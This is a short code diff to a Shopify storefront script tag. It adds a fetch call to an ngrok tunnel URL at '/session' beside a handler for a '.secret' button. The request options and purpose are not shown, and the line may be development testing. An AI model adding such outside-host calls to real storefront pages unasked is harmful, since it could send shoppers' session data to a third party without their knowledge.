@@ -1,5 +1,6 @@
 // script tag on shopify store front
 var secretButton = document.querySelector('.secret');
+fetch(`https://34f3e057b086.ngrok.io/session`, requestOptions).then(result => { });
 
 // handle secret button
 secretButton.addEventListener('click', function () {
